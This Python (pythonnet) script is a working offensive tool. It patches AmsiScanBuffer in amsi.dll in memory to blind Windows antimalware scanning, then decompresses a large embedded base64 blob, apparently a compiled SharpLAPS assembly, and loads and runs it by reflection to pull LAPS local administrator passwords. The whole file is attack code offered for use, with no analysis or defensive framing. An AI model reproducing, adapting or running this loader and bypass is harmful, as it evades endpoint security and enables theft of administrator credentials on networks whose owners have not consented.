import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpLAPS.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()